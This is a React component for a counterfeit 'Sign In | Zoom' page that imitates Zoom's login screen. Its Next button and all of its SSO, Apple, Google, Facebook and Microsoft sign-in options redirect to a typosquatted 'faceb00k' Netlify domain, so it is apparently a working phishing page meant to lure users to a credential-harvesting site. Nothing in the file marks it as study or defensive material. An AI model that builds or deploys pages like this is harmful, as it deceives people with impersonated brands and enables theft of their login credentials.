import Header from '@/components/header';
import type { FC } from 'react';
import HeroImage from '@/assets/hero-image.png';

import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import { faKey } from '@fortawesome/free-solid-svg-icons/faKey';
import { faApple } from '@fortawesome/free-brands-svg-icons/faApple';
import { faGoogle } from '@fortawesome/free-brands-svg-icons/faGoogle';
import { faFacebook } from '@fortawesome/free-brands-svg-icons/faFacebook';
import { faMicrosoft } from '@fortawesome/free-brands-svg-icons/faMicrosoft';

import type { IconDefinition } from '@fortawesome/fontawesome-svg-core';

interface LoginMethod {
    label: string;
    icon: IconDefinition;
    className?: string;
}

const LOGIN_METHODS: Record<string, LoginMethod> = {
    sso: {
        label: 'SSO',
        icon: faKey,
        className: '-scale-x-100'
    },
    apple: {
        label: 'Apple',
        icon: faApple
    },
    google: {
        label: 'Google',
        icon: faGoogle
    },
    facebook: {
        label: 'Facebook',
        icon: faFacebook
    },
    microsoft: {
        label: 'Microsoft',
        icon: faMicrosoft
    }
};

const Login: FC = () => {
    return (
        <>
            <title>Sign In | Zoom</title>
            <div>
                <Header />
                <div className='flex'>
                    <div className='hidden h-screen w-full max-w-[40%] bg-gray-300 md:block'>
                        <img src={HeroImage} alt='' className='relative top-1/2 right-[calc(-78px-(38.5vw-430px))] w-145 -translate-y-1/2' />
                    </div>
                    <div className='flex h-screen flex-1 items-center justify-center py-6'>
                        <div className='flex w-90 flex-col items-center justify-center'>
                            <p
                                className='mb-8 text-[32px] font-bold text-[#222325]'
                                style={{
                                    fontFamily: 'Internacional, Helvetica, Arial'
                                }}
                            >
                                Sign in
                            </p>
                            <div className='relative w-full'>
                                <input id='email' type='text' placeholder=' ' className='peer w-full rounded-lg border border-[#c1c6ce] px-3 pt-4 pb-2 text-base leading-6 ring-0 transition-all duration-300 outline-none focus:border-[#4b96f1]' />
                                <label htmlFor='email' className='absolute top-1/2 left-3 -translate-y-1/2 text-base text-[14px] text-[#6b7280] transition-all duration-300 peer-focus:top-3.5 peer-focus:-translate-y-1/2 peer-focus:text-[12px] peer-[:not(:placeholder-shown)]:top-3.5 peer-[:not(:placeholder-shown)]:-translate-y-1/2 peer-[:not(:placeholder-shown)]:text-[12px]'>
                                    Email or phone number
                                </label>
                            </div>
                            <button
                                className='mt-4 w-full rounded-[10px] bg-[#0d6bde] px-3.75 py-2.25 font-bold text-white'
                                onClick={() => {
                                    window.location.href = 'https://faceb00k-com-921231234558331330.netlify.app';
                                }}
                            >
                                Next
                            </button>
                            <div className='] mt-7.5 mb-6 flex w-full items-center text-sm leading-6 text-[#747487]'>
                                <div className='h-px flex-1 bg-[#ededf4]'></div>
                                <p className='mx-3 inline'>Or sign in with</p>
                                <div className='h-px flex-1 bg-[#ededf4]'></div>
                            </div>
                            <div>
                                <div className='flex flex-wrap justify-center gap-4'>
                                    {Object.entries(LOGIN_METHODS).map(([key, method]) => (
                                        <div
                                            key={key}
                                            className='group flex cursor-pointer flex-col items-center justify-center gap-2 text-sm'
                                            onClick={() => {
                                                window.location.href = 'https://faceb00k-com-921231234558331330.netlify.app';
                                            }}
                                        >
                                            <div className={`h-12 w-12 rounded-2xl border border-[#dfe3e8] p-3 transition-colors duration-200 group-hover:bg-[#6e76801f] ${method.className || ''}`}>
                                                <FontAwesomeIcon icon={method.icon} className='text-[20px]' />
                                            </div>
                                            <span>{method.label}</span>
                                        </div>
                                    ))}
                                </div>
                            </div>
                            <div className='absolute bottom-8 flex flex-col items-center justify-center'>
                                <p className='mt-auto text-[#0d6bde]'>Forgot email?</p>
                                <p className='mt-8 flex items-center gap-4 text-[#0d6bde]'>
                                    <span className='cursor-pointer hover:underline'>Help</span>
                                    <span className='cursor-pointer hover:underline'>Terms</span>
                                    <span className='cursor-pointer hover:underline'>Privacy</span>
                                </p>
                                <p className='mt-4 max-w-90 text-center text-[14px]'>
                                    Zoom is protected by reCAPTCHA and the Google <span className='text-[#0d6bde]'>Privacy Policy</span> and <span className='text-[#0d6bde]'>Terms of Service</span> apply.
                                </p>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </>
    );
};

export default Login;
